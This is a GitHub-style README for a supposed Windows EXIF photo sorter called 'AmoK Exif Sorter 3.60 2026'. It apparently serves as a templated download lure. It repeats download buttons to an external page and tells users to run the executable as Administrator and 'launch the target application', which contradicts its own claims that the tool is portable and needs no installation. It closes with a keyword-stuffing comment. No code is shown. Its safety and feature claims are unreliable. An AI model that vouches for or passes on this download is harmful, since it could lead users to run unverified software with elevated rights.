<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12&height=220&section=header&text=AmoK+Exif+Sorter+3.60+2026&fontSize=62&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Image+Metadata+Organizer+Tool&descAlignY=56&descSize=20" width="100%"/>

# AmoK Exif Sorter 3.60 2026 🖼️ 🗂️

![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="https://nino304.github.io/AmoK-Exif-Sorter-3.60/">
    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20AmoK Exif Sorter 3.60%202026-FF6600?style=for-the-badge&logoColor=white&labelColor=DD3300" width="420" alt="Download AmoK Exif Sorter 3.60 2026"/>
  </a>
</p>

</div>

## 📋 Table of Contents
- [📖 About](#-about)
- [⚙️ Requirements](#️-requirements)
- [✨ Features](#-features)
- [📦 Installation](#-installation)
- [📊 Compatibility](#-compatibility)
- [❓ FAQ](#-faq)
- [💬 Community & Support](#-community--support)
- [📜 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)

## 📖 About

AmoK Exif Sorter 3.60 2026 is a lightweight, standalone Windows utility that organizes image files based on embedded EXIF metadata. It reads creation dates, camera models, GPS coordinates, and other tags from JPEG and Raw files, then sorts them into date-based or custom folder structures automatically. No installation dependencies — just run the executable and clean up your photo library in seconds.

## ⚙️ Requirements

- **Operating System:** Windows 7, 8, 10, or 11 (64-bit recommended)
- **Runtime:** .NET Framework 4.7.2 or higher (included on most modern Windows systems)
- **Disk Space:** ~50 MB for the executable and temporary files
- **Internet:** Not required for core sorting; used only for optional updates
- **Permissions:** Administrator rights are not required for basic operation, but recommended for sorting files in protected directories

## ✨ Features

- **EXIF-Based Sorting 📅** — Automatically reads creation date, date taken, or last modified metadata from JPEG, TIFF, and Raw files.
- **Custom Folder Rules 🧩** — Define output folder templates using EXIF parameters (e.g., `YYYY/MM/DD` or `CameraModel/Date`).
- **Batch Processing 🔄** — Sort thousands of images in one pass with progress indicators and error logging.
- **Raw File Support 🆒** — Works with common Raw formats (CR2, NEF, ARW, DNG) by reading embedded preview or sidecar EXIF.
- **GPS Location Tagging 📍** — Extracts GPS coordinates from images and optionally appends location names via reverse geocoding (requires internet).
- **Duplicate Detection 🔍** — Flags and optionally skips or moves duplicate images based on file hash (MD5/SHA-1).
- **Preview Mode 👁️** — Simulates the sort result without moving files, so you can review the output folder tree before committing.
- **Portable & Lightweight 💻** — Single executable, no registry changes, no background services. Runs from USB drives.

## **🛡️ Safety**

AmoK Exif Sorter 3.60 2026 runs entirely locally on your machine. It does not transmit any image data or metadata to external servers (except optionally for GPS reverse geocoding). The tool performs read-only operations on the source files — it never modifies original JPEG or Raw data. However, always keep a backup of your media library before performing large batch operations. Use the preview mode to verify sorting rules produce the expected folder structure.

## **🎮 How to Use**

1. Launch the executable.
2. Select the source folder containing your images.
3. Choose a destination folder where sorted images will be placed.
4. Define sorting rules using the dropdown menus (e.g., sort by `Date Taken` into `Year\Month`).
5. Click "Preview" to simulate the sort — a tree view shows the resulting folder layout.
6. Click "Sort" to execute the actual file move/copy operation.

## 📦 Installation

1. Click the **Download** button at the top of this README (or open https://nino304.github.io/AmoK-Exif-Sorter-3.60/ in your browser).
2. Extract the archive if needed.
3. Run the downloaded executable as Administrator.
4. Follow the on-screen setup steps.
5. Launch the target application and enjoy.

## 📊 Compatibility

| OS              | Version       | Status | Notes                                         |
|-----------------|---------------|--------|-----------------------------------------------|
| Windows 7       | SP1           | ✅     | Requires .NET 4.7.2 update                    |
| Windows 8       | 8.0/8.1       | ✅     | Full support                                  |
| Windows 10      | All builds    | ✅     | Recommended                                   |
| Windows 11      | 21H2+         | ✅     | Fully compatible                              |
| Windows Server  | 2016/2019/2022| ✅     | Tested on GUI installations                   |
| Linux (Wine)    | 7.0+          | ⚠️     | EXIF reading works, file moves may be limited |
| macOS (CrossOver) | 22+         | ❌     | Not supported                                 |

## ❓ FAQ

**Q: Is AmoK Exif Sorter 3.60 2026 safe for my files?**  
A: Yes. The tool reads EXIF data without modifying source files. When sorting, files are moved or copied based on your rules. Use preview mode to see the exact outcome before execution. Always back up critical collections.

**Q: Can it sort files by camera model or lens?**  
A: Absolutely. You can create rules based on any standard EXIF field, including camera model, lens model, ISO, focal length, and more. The tool supports dynamic folder naming using these parameters.

**Q: What happens if an image has no EXIF data?**  
A: Images without EXIF metadata are placed into an "Unsorted" fallback folder by default. You can customize this behavior to use file creation/modification dates instead, or exclude unreadable files.

**Q: Does it support Unicode filenames and paths?**  
A: Yes. The executable fully supports Unicode characters in file paths and folder names, including Chinese, Japanese, Cyrillic, and special symbols.

## 💬 Community & Support

- [Report a Bug](../../issues)
- [Request a Feature](../../issues)
- <!-- Discord: [Join our Discord server](https://discord.gg/example) -->
- <!-- Telegram: [Join our Telegram group](https://t.me/example) -->

## 📜 License

MIT License

Copyright 2026 AmoK Exif Sorter 3.60

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

## ⚠️ Disclaimer

This software is provided for educational and organizational purposes only. The developers are not affiliated with any camera or software company. Users assume all responsibility for backing up their data before using this tool. The EXIF sorting process is designed to be non-destructive, but no guarantee is made against data loss or corruption. Use at your own risk.

<p align="center">
  <a href="https://nino304.github.io/AmoK-Exif-Sorter-3.60/">
    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20AmoK Exif Sorter 3.60%202026-FF6600?style=for-the-badge&logoColor=white&labelColor=DD3300" width="420" alt="Download AmoK Exif Sorter 3.60 2026"/>
  </a>
</p>

<!-- AmoK Exif Sorter 3.60 2026 free download GENERIC PROJECT utility unknown github -->